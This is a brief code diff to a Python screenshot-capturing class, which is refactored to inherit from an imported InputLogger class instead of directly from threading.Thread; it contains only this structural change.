@@ -3,12 +3,13 @@ import threading
 import pyscreenshot as ImageGrab
 
 import utils
+from input_logger import InputLogger
 from constants import (IMAGE_DIR, SCREENSHOT_INTERVAL,)
 
 
-class ScreenshotTaker(threading.Thread):
+class ScreenshotTaker(InputLogger):
     def __init__(self):
-        threading.Thread.__init__(self)
+        super().__init__()
         print("=====Screenshot Started=====")
 
     def takeScreenshot(self):
